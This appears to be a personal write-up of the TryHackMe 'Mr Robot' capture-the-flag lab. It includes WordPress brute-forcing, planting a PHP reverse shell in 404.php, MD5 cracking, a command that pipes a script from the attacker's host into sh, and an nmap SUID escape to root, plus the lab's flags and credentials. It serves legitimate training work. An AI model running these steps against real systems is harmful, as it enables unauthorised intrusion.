# TRYHACKME | MR ROBOT

> BLUE COSMO | 03/10/2021

## RESOURCES
```
10.10.246.245
```

## TASK 1
- RUN NMAP TO FIND PORT 80, 443 OPEN
- OPENED WEBSERVER, RAN 'dirb' SCANNER
- FOUND AND OPENED 'robots.txt':
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```
NAVIGATED TO FILES TO FIND KEY AND DICTIONARY FILE
```
073403c8a58a1f80d943455fb30724b9
```

## TASK 2
BRUTEFORCE WORDPRESS [FOUND IN 'dirb' SCAN] TO GET THESE CREDS:
```
USER - elliot
PASS - ER28-0652
```
AFTER LOGGING IN TO WP,
- IN THE APPEARANCE, CHANGE '404.php' WITH A PHP REVERSE Shell
- SETUP LISTENER AND OBTAIN ACCESS TO 'daemon'
- NAVIGATE TO HOME DIRECTORY
```bash
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```
DECRYPTED MD5:
```
abcdefghijklmnopqrstuvwxyz
```
- SWITCH USER TO 'robot' WITH NEW CREDENTIALS
- NAVIGATE TO HOME AND OBTAIN CREDENTIALS
```
822c73956184f694993bede3eb39f959
```
STABLIZE
```
python -c 'import pty; pty.spawn("/bin/sh")'
```

## TASK 3
- TO GET ROOT, IMPORT AND RUN 'linpeas.sh' BY RUNNING:
- ATTACKER PC: [LEAVE RUNNING]
```
sudo python3 -m http.server --bind YOUR-IP-HERE 8080
```
- TARGET PC:
```
curl http://YOUR-IP-HERE/linpeas.sh | sh
```
LOCATE NMAP'S ROOT PRIVELGES
```bash
$ -rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
```
EXPLOIT
```
nmap --interactive
!sh
```
NAVIGATE TO ROOT DIRECTORY AND OBTAIN CAT KEY FILE
```
04787ddef27c3dee1ee161b21670b4e4
```
